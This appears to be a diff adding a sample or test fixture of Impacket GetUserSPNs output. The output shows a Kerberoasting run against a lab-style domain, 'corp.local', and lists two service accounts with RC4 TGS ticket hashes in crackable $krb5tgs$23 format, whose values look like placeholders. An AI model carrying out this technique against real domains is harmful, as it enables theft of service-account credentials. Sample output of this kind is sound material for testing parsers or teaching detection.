@@ -1,0 +1,10 @@
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+ServicePrincipalName                  Name        MemberOf                                  PasswordLastSet      LastLogon
+------------------------------------  ----------  ----------------------------------------  -------------------  -------------------
+HTTP/web01.corp.local                 svc_web     CN=Domain Users,CN=Users,DC=corp,DC=local 2024-01-15 10:23:00  2026-05-02 09:15:00
+MSSQLSvc/db01.corp.local:1433         svc_sql     CN=Domain Users,CN=Users,DC=corp,DC=local 2023-11-02 08:00:00  2026-05-02 08:00:00
+
+[*] TGS-REP encryption type: rc4-hmac
+$krb5tgs$23$*svc_web$CORP.LOCAL$HTTP/web01.corp.local*$abcd1234efgh5678$0011223344556677889900112233445566778899
+$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/db01.corp.local:1433*$ffeedd00ccbbaa99$8877665544332211ffeeddccbbaa99887766554433221100
